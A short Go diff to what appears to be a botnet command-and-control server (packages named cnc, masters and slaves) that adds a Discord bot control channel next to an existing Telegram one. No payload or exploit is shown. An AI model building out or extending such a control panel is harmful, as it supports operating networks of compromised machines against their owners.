@@ -4,6 +4,7 @@ import (
 	"cnc/core/api"
 	"cnc/core/config"
 	"cnc/core/database"
+	"cnc/core/discordbot"
 	"cnc/core/frontend"
 	"cnc/core/masters"
 	"cnc/core/slaves"
@@ -27,6 +28,9 @@ func main() {
 	go frontend.Init()
 	if config.Config.Telegram.Enabled {
 		go tg.Init()
+	}
+	if config.Config.Discord.Enabled {
+		go discordbot.Init()
 	}
 
 	go func() {
